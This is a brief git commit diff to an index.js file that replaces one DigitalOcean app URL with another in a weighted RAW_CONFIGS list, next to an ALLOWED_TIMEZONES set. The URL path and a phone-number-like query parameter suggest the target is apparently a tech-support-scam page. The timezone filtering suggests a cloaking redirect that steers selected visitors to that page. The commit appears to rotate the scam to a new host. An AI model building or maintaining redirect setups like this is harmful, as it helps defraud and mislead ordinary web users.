7e1b09395b974abc7a1cc17010a0a566d4d0f481
paalakash <palaksh452@gmail.com>
2026-06-09 10:19:20 +0530

    Update RAW_CONFIGS URLs in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lionfish-app-kg9nw.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-1056", weight: 1.0 }
+    { url: "https://plankton-app-prxha.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-1056", weight: 1.0 }
 
 ];
 
